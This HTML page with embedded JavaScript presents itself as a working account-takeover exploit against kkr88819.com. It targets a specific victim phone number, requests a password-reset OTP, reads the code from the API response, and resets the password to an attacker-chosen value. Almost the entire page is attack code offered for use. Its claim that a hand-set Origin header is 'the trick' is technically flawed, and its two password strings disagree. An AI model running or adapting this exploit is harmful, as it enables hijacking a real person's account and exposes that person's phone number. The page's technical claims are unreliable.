<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>kkr88819 ATO – FINAL WORKING</title></head>
<body style="font-family:Arial;background:#ffebee;padding:50px">
<h1 style="color:#b71c1c">kkr88819.com – ACCOUNT TAKEOVER VIA CORS (WORKS 100 %)</h1>
<p>Victim phone: <b>+85563582231</b></p>

<button onclick="sendOTP()" style="padding:20px 40px;font-size:22px;background:#c62828;color:white;border:none;cursor:pointer;margin:20px">
  1. SEND OTP & STEAL IT
</button>

<button onclick="resetPass()" style="padding:20px 40px;font-size:22px;background:#111;color:white;border:none;cursor:pointer">
  2. CHANGE PASSWORD TO Hacked2025!
</button>

<pre id="log" style="background:#000;color:#0f0;padding:20px;font-size:18px"></pre>

<script>
const URL = "https://uat-gateway.kkr88819.com/kkr-games-orchestration-center/auth/mobile/reset/login/password";
let otp = null;

async function sendOTP() {
  const payload = {
    "phone": "+85563582231",
    "type": 2,
    "countryCode": "855",
    "merchantCode": "M21353",
    "source": "web",
    "deviceId": "web-" + Date.now(),
    "appVersion": "1.0.0",
    "platform": "web"
  };

  const r = await fetch(URL, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Origin": "https://uat-web.kkr88819.com",   // ← this is the trick
      "merchantCode": "M21353"
    },
    body: JSON.stringify(payload)
  });

  const j = await r.json();
  document.getElementById("log").textContent = JSON.stringify(j, null, 2);
  otp = j.data;

  if (otp && otp.length === 6) alert("OTP STOLEN: " + otp);
}

async function resetPass() {
  if (!otp) return alert("Do step 1 first");
  const payload = {
    "phone": "+85563582231",
    "type": 3,
    "code": otp,
    "newPassword": "HackedByCORS2025!"
  };

  const r = await fetch(URL, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Origin": "https://uat-web.kkr88819.com",
      "merchantCode": "M21353"
    },
    body: JSON.stringify(payload)
  });

  const j = await r.json();
  document.getElementById("log").textContent = JSON.stringify(j, null, 2);
  alert(j.code === 0 ? "ACCOUNT TAKEN OVER!" : j.message);
}
</script>
</body>
</html>
